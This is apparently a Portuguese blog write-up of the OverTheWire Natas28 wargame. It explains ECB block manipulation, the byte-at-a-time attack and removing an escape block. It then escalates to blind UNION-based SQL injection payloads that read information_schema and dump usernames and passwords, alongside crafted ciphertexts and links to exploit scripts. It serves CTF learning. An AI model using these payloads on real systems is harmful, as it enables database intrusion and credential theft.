---
title: 'Manipulando blocos cifrados: explorando ECB para escalar até um SQLi'
date: 2026-06-21 16:02:31
tags:
---

## Sumário

1. [Introdução](#Introducao)
2. [Modo ECB/CBC](#Modo-ECB-CBC) — *conceito*
3. [Início do reconhecimento](#Inicio)
4. [Etapa 1 — Identificando o tamanho do bloco](#Etapa-1-—-Identificando-o-tamanho-do-bloco)
5. [Etapa 2 — Identificando se é CBC ou ECB](#Etapa-2-—-Identificando-se-e-CBC-ou-ECB)
6. [Etapa 3 — Onde o input começa](#Etapa-3-—-Onde-o-input-comeca)
7. [Etapa 4 — Identificando o sufixo](#Etapa-4-—-Identificando-o-sufixo-que-existe-apos-o-input)
8. [Exploração](#Exploracao) — *prática*
   - [Passo 1 — Forçando um erro de SQL](#PASSO-1-Tentando-forcar-um-erro-de-SQL)
   - [Passo 2 — Testando SQL Injection](#PASSO-2-Testando-SQL-Injection)
   - [Passo 3 — Extraindo nomes de colunas](#PASSO-3-Extrair-o-nome-das-colunas-da-tabela-‘users’)
   - [Passo 4 — Extraindo o conteúdo da tabela](#PASSO-4-Extrair-o-conteudo-da-tabela-‘users’)
9. [Conclusões](#Conclusoes)
10. [Meu aprendizado com este estudo](#Meu-aprendizado-com-este-estudo)

---

## Introdução

**Natas28** é um dos níveis do **Natas**, o wargame de segurança web do site OverTheWire (overthewire.org), focado em vulnerabilidades comuns em aplicações web.

Nesse nível, a aplicação tem um campo de busca ("query") cujo conteúdo é criptografado e enviado de volta como parâmetro na URL (em Base64), sem acesso ao código-fonte.

O desafio explora a fragilidade da criptografia que utiliza cifra ECB com blocos de 16 bytes de forma determinística. Como o modo ECB cifra cada bloco de 16 bytes separadamente e sempre da mesma forma para o mesmo texto, é possível manipular o tamanho da entrada para isolar e "remontar" blocos cifrados, efetivamente alterando o conteúdo decifrado no servidor sem saber a chave.

Como o conteúdo que está sendo criptografado é um SQL, neste caso específico é possível escalar a exploração da fragilidade criptográfica para um SQLi, mesmo sem acesso às chaves de criptografia.

Neste cenário, a informação digitada no input em texto plano é enviada para o servidor, onde é criptografada no backend e retornada como redirecionamento para outro endpoint com o resultado criptografado, como no exemplo:

http://natas28.natas.labs.overthewire.org/search.php/?query=[valor-criptografado]

Não temos acesso à rotina de criptografia, mas nesse cenário é possível observar livremente os valores que inserimos no input e o resultado criptográfico que o servidor gera.

A intenção é conseguir manipular a criptografia para inserir ou remover informações do conteúdo protegido que o servidor irá processar, sendo possível assim quebrar a confiança do método e injetar conteúdos maliciosos.

Minha intenção **não** é passar a solução do desafio, mas sim documentar o processo de entendimento, reconhecimento e possível exploração já que um cenário similar é perfeitamente possível de encontrarmos em sistemas do mundo real.

É importante esclarecer que não sou especializado em técnicas de criptografia, conheço o básico do que já utilizei e implementei como desenvolvedor. Então o que trago é uma visão partindo desse princípio, imaginando que seja o mesmo ponto de partida de quem está no dia a dia desenvolvendo sistemas.

Dada minha falta de especialização, corri riscos copiando e colando métodos de criptografia obtidos em fóruns como StackOverflow, sem ter o devido entendimento dos diversos parâmetros possíveis de serem atribuídos no desenvolvimento de rotinas desse tipo, como nesse caso: **Modo ECB ou CBC**.

> 📌 **Conceito** — as duas próximas seções (Modo ECB/CBC) são teóricas. Quem já conhece a diferença entre os dois modos pode ir direto para [Início do reconhecimento](#início).

## Modo ECB/CBC

No modo ECB, a mensagem é dividida em blocos de tamanho fixo (geralmente 16 bytes, no caso do AES) e **cada bloco é cifrado de forma totalmente independente**, usando a mesma chave e o mesmo algoritmo, sem nenhuma relação entre os blocos. Isso significa que blocos de texto plano idênticos sempre geram blocos de texto cifrado idênticos. Essa propriedade é justamente o que torna o ECB inseguro para a maioria das aplicações, pois um atacante pode identificar padrões repetidos no texto cifrado, reordenar blocos, ou até substituir blocos cifrados por outros conhecidos para manipular o conteúdo decifrado. Por essa razão, o ECB é considerado o modo de operação mais fraco entre os modos de cifra de bloco.

No modo CBC, cada bloco de texto plano é submetido a um **XOR com o bloco de texto cifrado anterior** antes de ser cifrado, criando uma dependência (um "encadeamento") entre todos os blocos da mensagem. Como o primeiro bloco não tem um "bloco anterior", usa-se um **vetor de inicialização (IV)**, um valor aleatório gerado para cada cifragem, que é feito o XOR com o primeiro bloco de texto plano. Essa dependência resolve o principal problema do ECB: blocos de texto plano idênticos produzem blocos de texto cifrado diferentes (desde que o IV seja diferente ou o conteúdo anterior mude), eliminando os padrões visíveis. Por outro lado, o CBC traz suas próprias fragilidades clássicas, como vulnerabilidade a ataques de **padding oracle** (quando o servidor revela, mesmo que indiretamente, se o preenchimento/padding de uma mensagem decifrada é válido) e a necessidade de um IV verdadeiramente aleatório e imprevisível para manter a segurança.

Vou focar no ECB, mas a ideia é similar e vale para o CBC, que adiciona uma camada de tentativa de dificuldade com o XOR, porém é de conhecimento geral que o XOR é facilmente reversível.

> A partir daqui o post entra na parte hands-on: reconhecimento do comportamento da criptografia e, depois, a exploração propriamente dita.

## Início

Dada esta introdução, agora sim vamos para o processo de reconhecimento e possível exploração de criptografia determinística em ECB. O reconhecimento está dividido em 4 etapas.

Neste cenário em específico, como o conteúdo criptografado é enviado de forma aberta na URL (http://natas28.natas.labs.overthewire.org/search.php/?query=[valor-criptografado]), é possível mudar o valor para algo inválido aleatório qualquer, causando uma exceção esperada no método de decriptografia. Observando a mensagem de erro retornada, conseguimos obter informações relevantes como:

```bash
Zero padding found instead of PKCS#7 padding
```

Este tipo de exceção geralmente é uma **forte** indicação de que o método está utilizando o modo CBC ou ECB. Este é o primeiro passo do reconhecimento e exploração.

### Etapa 1 — Identificando o tamanho do bloco

> **TL;DR:** variando o tamanho do input e observando quando o ciphertext cresce um bloco inteiro, descobrimos que o tamanho do bloco é de **16 bytes**.

O próximo passo é identificar qual é o tamanho do bloco utilizado pela rotina, se está configurado com 16 bytes, 32 bytes, etc. Como neste cenário é possível informar qualquer valor para gerar a criptografia, é possível testar informando um input qualquer e observar o tamanho em bytes do texto criptografado gerado. Depois ir aumentando o tamanho do input caractere a caractere até observarmos o aumento do bloco do resultado criptográfico e então teremos o exato tamanho de bloco utilizado.

Na prática, pode ser feito da seguinte forma:

1. Pesquisar o input com string vazia, o base64 gerado é: 
```
Base64:
    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
Hex:
    fa094469ee96ff55e303bbd19b6d6737211ca3f73e2764dd474429f1d7233cba1ffd83266b5cb32f651f8d05ea404a29dfa3b46aaf82d741713ff9ab0508ead1e3ac687f89868b1b054184426cffb6
```

2. Pesquisar com 1 caractere apenas: 
```
Base64: 
    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Hex: 
    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2ab880a8f136fbeb98967891324a1b075bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970
```

A mesma quantidade de bytes é gerada, isso é porque o tamanho final sempre será um múltiplo do tamanho do bloco, mesmo que “sobre” bytes para ser utilizado dentro do bloco e aqui é o *padding* que entra em ação.

Esta mesma quantidade de bytes será gerada até o limite da entrada de *12 caracteres*, ao realizar uma entrada com *13 caracteres* é possível observar a adição de um novo bloco. Então:

3. Pesquisar com '13' caracteres (exemplo **aaaaaaaaaaaaa**), o base64 gerado é: 
```
Base64:
    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
Hex:
    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e1f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98
```

Ao inserir o 13º caractere é possível observar um salto de 16 bytes (*32 caracteres a mais, cada par é 1 byte*). Isto significa que cada bloco possui 16 bytes, esta é a primeira parte que o [**solver.py**](https://github.com/Gadotti/natas/blob/main/natas28/solver.py) identifica.

Para realizar estas conversões, é possível utilizar o https://cyberchef.org para fazer o 'URL Decode' / 'From Base64' / 'To Hex' para analisar ou usar o script [**blocks.py**](https://github.com/Gadotti/natas/blob/main/natas28/blocks.py), por exemplo.

### Etapa 2 — Identificando se é CBC ou ECB

> **TL;DR:** se blocos cifrados se repetem para entradas repetidas, é ECB. Em CBC isso não pode acontecer, pois cada bloco depende do anterior.

O processo de identificação pode ser realizado da seguinte forma:

1. Buscar uma string longa de caracteres iguais, ex. 32 a 64 'A'.
2. Decodificar e quebrar em pedaços de 16 bytes, que é o tamanho identificado na etapa anterior.
3. Procurar por dois blocos iguais.

Ou seja, em ECB, bloco-igual-de-entrada produz bloco-igual-de-saída (cada bloco é cifrado isoladamente, sem encadeamento). Se houver blocos cifrados repetidos, é ECB.

Usando o [**blocks.py**](https://github.com/Gadotti/natas/blob/main/natas28/blocks.py) que gera e organiza os blocos de 16 bytes de diferentes conteúdos encriptados, é possível ver que há repetição dos blocos mesmo com conteúdos diferentes.

```
[string vazia] -> 80 bytes, 5.00 blocos de 16B
	    bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x6
	    bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x6
	    bloco 2: e87ff60c99ad72ccbd947e3417a90128
	    bloco 3: a77e8ed1aabe0b5d05c4ffe6ac1423ab   <-- compartilhado x3
	    bloco 4: 478eb1a1fe261a2c6c15061109b3feda   <-- compartilhado x3

	aaaaaaaaaa   -> 80 bytes, 5.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x6
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x6
	   bloco 2: c0872dee8bc90b1156913b08a223a39e   <-- compartilhado x3
	   bloco 3: 738a5ffb4a4500246775175ae596bbd6
	   bloco 4: f34df339c69edce11f6650bbced62702

	aaaaaaaaaaaaaaaa   -> 96 bytes, 6.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x6
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x6
	   bloco 2: c0872dee8bc90b1156913b08a223a39e   <-- compartilhado x3
	   bloco 3: 8925158cfc5ac06d22bfda0b72c8f151 (aqui só tem a's)
	   bloco 4: a77e8ed1aabe0b5d05c4ffe6ac1423ab   <-- compartilhado x3
	   bloco 5: 478eb1a1fe261a2c6c15061109b3feda   <-- compartilhado x3

	bbbbbbbbbbbbbbbb   -> 96 bytes, 6.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x6
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x6
	   bloco 2: 5c805cbd29fb63e2ec53645325c7a896
	   bloco 3: b3dac59b170d9d960df8086e22e47d79 (aqui só tem b's)
	   bloco 4: a77e8ed1aabe0b5d05c4ffe6ac1423ab   <-- compartilhado x3
	   bloco 5: 478eb1a1fe261a2c6c15061109b3feda   <-- compartilhado x3

	aaaaaaaaaaaaaaaaa   -> 96 bytes, 6.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x6
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x6
	   bloco 2: c0872dee8bc90b1156913b08a223a39e   <-- compartilhado x3
	   bloco 3: adf8a1ad0177ed1ecad3ac7c1082aa9e
	   bloco 4: bdfa1054ec68515cf96f2a5544591947
	   bloco 5: 904f4b2abf2c2d7686aa72a53151c970
```

Nesta análise, os blocos de cauda apareceram REPETIDOS em posições diferentes, mesmo com blocos diferentes ANTES deles. Em CBC isso seria impossível. **Logo: ECB**. 

Exemplo:
Bloco: `a77e8ed1aabe0b5d05c4ffe6ac1423ab`
Bloco: `478eb1a1fe261a2c6c15061109b3feda`

### Etapa 3 — Onde o input começa

> **TL;DR:** repetindo blocos "gêmeos" conhecidos e variando um prefixo de teste, conseguimos calcular que existe um prefixo fixo de **38 bytes** antes do nosso input (o texto `SELECT * FROM data WHERE query LIKE '%`).

Este é um cenário em que é possível identificar que sempre há um prefixo fixo na informação encriptada gerada e isto é específico deste caso de estudo, em outros cenários pode ou pode não haver prefixos, tudo depende da lógica do sistema ou da rotina em avaliação.

Isto ocorre ao observar que, independentemente do input inserido, os blocos 0 e 1 sempre se mantêm iguais, então o conteúdo enviado no input pode iniciar logo no início do bloco 2 ou em alguma parte dele.

Para que seja possível manipular os blocos, é necessário entender exatamente onde começa a inserção do input no conteúdo criptografado gerado, tentando identificar o tamanho desse prefixo.

A técnica utilizada aqui é forçar e procurar por blocos **gêmeos**, variando uma cadeia de caracteres iguais ('A's por exemplo).

Isso é possível repetindo um loop variando o número de 'A' na frente de 32 'Q'. A quantidade de **32** é porque queremos **2** blocos e cada bloco tem **16 bytes**. Quantidade que pode variar de acordo com o tamanho do bloco se fosse diferente de 16 bytes.

A sequência será:
- "QQQ...Q"            (0 A + 32 Q)
- "A" + "QQQ...Q"      (1 A + 32 Q)
- "AA" + "QQQ...Q"     (2 A + 32 Q)  ... etc.

Para cada laço do loop: 
1. Decodificar, quebrar em blocos de 16 bytes e procurar por **DOIS blocos** em *hex* iguais e adjacentes.
2. No primeiro laço que identificar os blocos gêmeos, anotar:
   - f = quantos 'A' foram inseridos
   - j = índice onde os blocos gêmeos começam

Ou seja: `prefixo = j*16 - f`

Resultado um passo antes do esperado e depois com o resultado encontrado:
```
	(9 A + 32 Q)
	AAAAAAAAAQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ  -> 112 bytes, 7.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x2
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x2
	   bloco 2: f80604f6be86f614ea730043f45f2c60
	   bloco 3: 3738c36c60f76b4c998038d5e69e92ad   <-- compartilhado x2
	   bloco 4: 339345f248b172731c9781b38f2766fd
	   bloco 5: a09522f301cf9d36ac7023f165948c5a
	   bloco 6: 9739cd90522fa7a86f95773b56f9f8c0

	(10 A + 32 Q)
	AAAAAAAAAAQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ -> 112 bytes, 7.00 blocos de 16B
	   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x2
	   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x2
	   bloco 2: 5f22a727f625419a466f9af53891f9b2
	   bloco 3: 3738c36c60f76b4c998038d5e69e92ad   <-- rep-interno, compartilhado x2
	   bloco 4: 3738c36c60f76b4c998038d5e69e92ad   <-- rep-interno, compartilhado x2
	   bloco 5: 738a5ffb4a4500246775175ae596bbd6
	   bloco 6: f34df339c69edce11f6650bbced62702
```

A lógica é: onde os blocos se repetem **(3 e 4)** sabemos que só tem o caractere '**Q**' e o que vem antes é '**A**'.
Como sabemos quantos 'A' inserimos, é possível calcular o byte que ele começa e o tamanho então no nosso prefixo.

Leitura:
- Com **f=10** 'A' os blocos 3 e 4 saíram IDÊNTICOS.
- prefixo = 3*16 - 10 = 48 - 10 = 38 bytes.
- Isto bate com o texto claro "`SELECT * FROM data WHERE query LIKE '%`", que tem exatamente 38 caracteres.

Seria equivalente definir que o prefixo vai até esta **parte** aqui do bloco 2:
bloco 0: `1be82511a7ba5bfd578c0eef466db59c`
bloco 1: `dc84728fdcf89d93751d10a7c75c8cf2`
bloco 2: `5f22a727f625[...]`

Então é possível afirmar que o tamanho do prefixo é de **38 bytes** e o *input* começa a partir deste ponto.

### Etapa 4 — Identificando o sufixo que existe após o input

> **TL;DR:** com um ataque *byte-at-a-time* clássico de ECB, recuperamos o sufixo `%'` que fecha o SQL após o nosso input.

Neste cenário em específico, além da existência de um prefixo, também é possível notar que existe um sufixo adicionado ao resultado final. Como desconfiamos que neste desafio o conteúdo final é um SQL, para que seja possível manipular o comando é importante identificar o sufixo.

Utilizando as informações obtidas até aqui, a recuperação do sufixo agora é possível realizando um teste de recuperação byte a byte, é um ataque conhecido como  "*byte-at-a-time*" do ECB.

O processo começa descobrindo o COMPRIMENTO do sufixo, aumentando o input até o ciphertext ganhar +1 bloco. A diferença irá revelar quantos bytes de sufixo existem.

Então para cada posição do sufixo:

1. Montar uma "moldura curta" (short) que deixa o byte-alvo do sufixo cair como ÚLTIMO byte de um bloco conhecido.
2. Guardar o bloco cifrado alvo.
3. Testar os 256 valores possíveis (short + known + palpite) até o bloco cifrado bater. O palpite que casa **é** o byte do sufixo.
4. Deslizar e repetir para o próximo byte.

Neste cenário em específico, a rotina realiza o *escape* de aspas simples para tentar evitar SQLi, então ao inserir `'` o conteúdo vira `\'`. É importante esta consideração, pois é uma situação em que nenhum byte testado consegue reproduzir uma aspa literal naquela posição, mas, com isso, podemos assumir que o sufixo termina em aspa.

O passo a passo manual poderia ser realizado da seguinte forma:
Assumindo o **prefix_pad = 10** (informação obtida das etapas anteriores), para achar o 1º byte do sufixo:
1. Buscar `"A"*10 + "A"*15` (ou seja, alinhar e deixar 15 A no bloco alvo).
Isso empurra o 1º byte do sufixo para a ÚLTIMA posição desse bloco.
Anotar o bloco cifrado alvo (o de índice start).
2. Buscar `"A"*10 + "A"*15 + X`, variando X entre os caracteres
imprimíveis `' ', '%', '&', ...` Para cada X, comparar o MESMO bloco.
Quando o bloco bater com o do passo 1, aquele X é o 1º byte do sufixo.
3. **Resultado esperado**: o 1º byte do sufixo é '`%`'. O 2º seria a aspa,
que nunca vai casar, pois está sendo escapada. 

Conclusão do sufixo: `%'`

EXEMPLO entrada/saida:

- prefix=38
- prefix_pad=10

Na prática seria assim:
```
"A"*10 + "A"*15 (MODELO)
AAAAAAAAAAAAAAAAAAAAAAAAA  -> 96 bytes, 6.00 blocos de 16B
   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x3
   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x3
   bloco 2: 5f22a727f625419a466f9af53891f9b2   <-- compartilhado x3
   bloco 3: f560542474c9b06031b5fda36f687acf   <-- compartilhado x2 (AQUI TEM 15 'A' + O PRIMEIRO CARACTERE DO NOSSO SUFIXO)
   bloco 4: a09522f301cf9d36ac7023f165948c5a
   bloco 5: 9739cd90522fa7a86f95773b56f9f8c0

"A"*10 + "A"*15 + B
AAAAAAAAAAAAAAAAAAAAAAAAAB -> 96 bytes, 6.00 blocos de 16B
   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x3
   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x3
   bloco 2: 5f22a727f625419a466f9af53891f9b2   <-- compartilhado x3
   bloco 3: 2c352332671d37b81cb4a897f1d65e60 (É DIFERENTE DO BLOCO 3 DO MODELO, ENTÃO NÃO É 'B')
   bloco 4: 738a5ffb4a4500246775175ae596bbd6   <-- compartilhado x2
   bloco 5: f34df339c69edce11f6650bbced62702   <-- compartilhado x2

"A"*10 + "A"*15 + %
AAAAAAAAAAAAAAAAAAAAAAAAA% -> 96 bytes, 6.00 blocos de 16B
   bloco 0: 1be82511a7ba5bfd578c0eef466db59c   <-- compartilhado x3
   bloco 1: dc84728fdcf89d93751d10a7c75c8cf2   <-- compartilhado x3
   bloco 2: 5f22a727f625419a466f9af53891f9b2   <-- compartilhado x3
   bloco 3: f560542474c9b06031b5fda36f687acf   (É IGUAL AO BLOCO 3 DO MODELO, ENTÃO CONFIRMADO QUE É O CARACTER %)
   bloco 4: 738a5ffb4a4500246775175ae596bbd6   <-- compartilhado x2
   bloco 5: f34df339c69edce11f6650bbced62702   <-- compartilhado x2
```

O script [**solver.py**](https://github.com/Gadotti/natas/blob/main/natas28/solver.py) automatiza este processo.

> Terminado o reconhecimento (sabemos o tamanho do bloco, que é ECB, o prefixo de 38 bytes e o sufixo `%'`), seguimos para a exploração propriamente dita.

## Exploração

Agora com todas as informações em mãos, é possível partir para a exploração e manipular o resultado criptográfico, inserindo ou removendo informações do conteúdo que a rotina no servidor irá decriptar com sucesso, confiando no conteúdo recebido como válido e íntegro.

Como em ECB cada bloco é uma "*caixa*" independente, é possível jogar fora apagando um bloco sem afetar o resto. A ideia é "*empurrar*" o escape, ou fechamento do SQL, para um bloco que vamos descartar e com isso manipular o SQL.

A ideia então é trabalhar com os 15 caracteres "*empurradores*": `"AAAAAAAAAABBBBBBBBBBBBBBB" + ' + <injeção>`

O servidor vai escapar a aspa (`'`) transformando em `\'`. A aspa vai ser jogada no próximo bloco e vamos descartar o bloco que vai ficar "`AAAAAAAAAABBBBBBBBBBBBBBB\`"

### PASSO 1: Tentando forçar um erro de SQL

> **TL;DR:** o payload de teste não retorna erro algum, o que revela que a aplicação está omitindo erros de SQL. Será necessário seguir em modo *blind*.

A ideia é quebrar o formato do SQL para investigar o resultado.
Payload que quebra o SQL: `AAAAAAAAAAAAAAAAAAAAAAAA` (*São 10 'A' para completar o primeiro bloco + 14 'A' para que os caracteres de fechamento %' do SQL fiquem no mesmo bloco*)
Usando o [**blocks.py**](https://github.com/Gadotti/natas/blob/main/natas28/blocks.py), temos os blocos:

```
PAYLOAD-INVALIDO -> 96 bytes, 6.00 blocos de 16B
bloco 0: 1be82511a7ba5bfd578c0eef466db59c
bloco 1: dc84728fdcf89d93751d10a7c75c8cf2
bloco 2: 5f22a727f625419a466f9af53891f9b2 (Tem os 10 'A's)
bloco 3: 85816b43e932247f6976b643b018ca57 (Tem os 14 'A's + caracteres do SQL - Eliminar esse bloco para quebrar o SQL)
bloco 4: 896de90884f86108b167f8b4aea5d763
bloco 5: 917232051483e68e458fd066167b30a3
```

Depois, usando o [**assemble.py**](https://github.com/Gadotti/natas/blob/main/natas28/assemble.py), montamos o novo payload: 
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
```
*Infelizmente nenhum erro é retornado*, o que indica que erros de SQL estão sendo **omitidos**, então é necessário seguir de modo '**blind**' mesmo.

### PASSO 2: Testando SQL Injection

> **TL;DR:** o payload `UNION SELECT 1` é injetado com sucesso e o "1" aparece refletido no HTML, confirmando de que a SQL Injection funciona.

A ideia é utilizar o payload "`AAAAAAAAAABBBBBBBBBBBBBBB' UNION SELECT 1,2 #`" para iniciar a injeção. O que estiver no bloco dos **'B's** será descartado. A ideia é passar `15 'B's + '`, como esperamos que a aspa tenha o escape com `\`, o payload internamente vira "`AAAAAAAAAABBBBBBBBBBBBBBB\' UNION SELECT 1,2 #`", fazendo com que o bloco 3 fique com o conteúdo "`BBBBBBBBBBBBBBB\`", e eliminando esse bloco o payload vira "`AAAAAAAAAA' UNION SELECT 1,2 #`"

Passando no [**blocks.py**](https://github.com/Gadotti/natas/blob/main/natas28/blocks.py) fica:

```
AAAAAAAAAABBBBBBBBBBBBBBB' UNION SELECT 1,2 # -> 128 bytes, 8.00 blocos de 16B
bloco 0: 1be82511a7ba5bfd578c0eef466db59c
bloco 1: dc84728fdcf89d93751d10a7c75c8cf2
bloco 2: 5f22a727f625419a466f9af53891f9b2
bloco 3: a090b8345b6d2823ac11042c72490053 <-Eliminar
bloco 4: af5cfa880a255da5c0e4fe02e3d6068d
bloco 5: ca821e1345a7716b348a3fcfc5915ac7
bloco 6: 4257a343daadaaf2c0e3a1d71ce03dd1
bloco 7: 7b7baca655f298a321e90e3f7a60d4d8
```

Usando o script [**assemble.py**](https://github.com/Gadotti/natas/blob/main/natas28/assemble.py) para remontar o valor criptografado sem o *bloco 3 (a090b8345b6d2823ac11042c72490053)*, temos:

```
Hex:
    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf25f22a727f625419a466f9af53891f9b2af5cfa880a255da5c0e4fe02e3d6068dca821e1345a7716b348a3fcfc5915ac74257a343daadaaf2c0e3a1d71ce03dd17b7baca655f298a321e90e3f7a60d4d8

base64:
    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyr1z6iAolXaXA5P4C49YGjcqCHhNFp3FrNIo/z8WRWsdCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==

base64+url:
    G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyr1z6iAolXaXA5P4C49YGjcqCHhNFp3FrNIo/z8WRWsdCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A%3D%3D
```

O HTML com esse payload vai retornar em branco, pois os erros de SQLs estão sendo omitidos. Quando for executado com sucesso o **UNION**, vai trazer o resultado do **UNION** ao resultado que viria.

Então mudando o payload para usar 1 coluna (`AAAAAAAAAABBBBBBBBBBBBBBB' UNION SELECT 1 #`), quebrando em blocos, eliminando o bloco 3, fazendo o re-assemble e gerando um novo base64 em url encode para enviar no request, teremos o resultado:

`<h2> Whack Computer Joke Database</h2><ul><li>1</li></ul>`

O **"1"** no html é o resultado do `UNION SELECT 1` que esperávamos.

A partir daqui, é só prosseguir com técnicas de injeção de SQL para extrair dados do banco de dados como nome de tabelas e campos para utilizar na extração do conteúdo desejado.

### PASSO 3: Extrair o nome das colunas da tabela 'users'

> **TL;DR:** uma `UNION SELECT` contra `information_schema.columns` revela os nomes das colunas: `username` e `password`.

Seguindo os princípios anteriores, utilizar o payload:
"` UNION SELECT GROUP_CONCAT(column_name SEPARATOR 0x0a) FROM information_schema.columns WHERE table_name=0x7573657273`"

Lembrando que *0x7573657273* é equivalente a '*users*'

Esta injeção retornará os resultados:
- password
- username

### PASSO 4: Extrair o conteúdo da tabela 'users'

> **TL;DR:** com os nomes das colunas em mãos, uma segunda `UNION SELECT` extrai o par usuário/senha, que é a flag do desafio.

Seguindo a mesma ideia, então agora é possível fazer um *SELECT* na tabela '*users*' usando os campos obtidos no passo anterior:
"` UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users`"

Esta injeção retornará o resultado da *flag* do desafio.

#### Todos os passos acima estão automatizados através dos scripts:
- [solver.py](https://github.com/Gadotti/natas/blob/main/natas28/solver.py)
- [natas28_exploit.py](https://github.com/Gadotti/natas/blob/main/natas28/natas28_exploit.py)

## Conclusões

Qualquer cifra de bloco operando em modo ECB herda essa fraqueza, independente do algoritmo de base. AES-ECB, 3DES-ECB, Camellia-ECB, Blowfish-ECB, todos sofrem do mesmo problema, isto porque a fraqueza está em como os blocos são combinados.

O CBC encadeia os blocos via XOR com o bloco cifrado anterior. Isso quebra o determinismo (com um IV aleatório) e a independência, então o copia-e-cola do tipo feito aqui não funciona. Mas o CBC tem a sua própria fragilidade, o bit-flipping e o *padding oracle*, citado no início. Ou seja, o CBC é vulnerável de um jeito diferente, especialmente quando o sistema revela um erro do tipo *padding (PKCS#7)*, porque o *padding oracle* depende do sistema revelar se o padding ficou válido ou não.

## Meu aprendizado com este estudo

- **Modos de operação de cifra de bloco**: a diferença prática entre ECB (cada bloco cifrado de forma independente e determinística) e CBC (blocos encadeados via XOR, dependentes de um IV).
- **Por que ECB é inseguro**: blocos de texto plano idênticos geram blocos cifrados idênticos, criando padrões visíveis e explorável sem conhecer a chave.
- **Fragilidades do CBC**: vulnerabilidade a ataques de *padding oracle* e a importância de um IV verdadeiramente aleatório.
- **Engenharia reversa de uma rotina de criptografia "caixa-preta"**: como inferir o comportamento de um sistema observando apenas entradas e saídas, sem acesso ao código-fonte ou à chave.
- **Como identificar o tamanho do bloco** usado por uma cifra, variando o tamanho do input e observando saltos no tamanho do ciphertext.
- **Como diferenciar ECB de CBC na prática**: buscar blocos cifrados repetidos a partir de entradas repetidas.
- **Técnica de "blocos gêmeos"** para descobrir o tamanho exato de um prefixo fixo que antecede o input do usuário dentro do conteúdo criptografado.
- **Ataque *byte-at-a-time* clássico de ECB**: como recuperar, byte a byte, um sufixo desconhecido que vem após o input controlado pelo atacante.
- **Manipulação de blocos ECB ("bloco-caixa")**: como descartar um bloco inteiro (por exemplo, contendo um caractere de escape) para alterar o conteúdo decifrado no servidor sem conhecer a chave.
- **Escalada de uma fraqueza criptográfica para SQL Injection**: transformar uma vulnerabilidade de modo de cifra em uma injeção de SQL funcional.
- **Técnicas de exploração de SQLi às cegas (*blind*)**: como confirmar uma injeção via `UNION SELECT` mesmo quando erros de SQL são suprimidos pela aplicação.
- **Uso de literais hexadecimais para burlar filtros de escape**: representar strings como `0x7573657273` (equivalente a `'users'`) evita o uso de aspas no payload, contornando rotinas que escapam ou bloqueiam o caractere `'` como proteção contra SQLi.
- **Extração de metadados e dados via SQLi**: uso de `information_schema.columns` para descobrir nomes de colunas e, em seguida, extrair os dados de uma tabela.
- **Ferramentas e fluxo de trabalho prático**: uso combinado de scripts próprios (`blocks.py`, `assemble.py`, `solver.py`) e ferramentas externas (CyberChef) para decodificar, analisar e remontar payloads criptografados.
- **Mentalidade de pentest/CTF**: documentação do processo de reconhecimento e exploração de forma estruturada, útil tanto para wargames (Natas/OverTheWire) quanto para vulnerabilidades reais em sistemas de produção.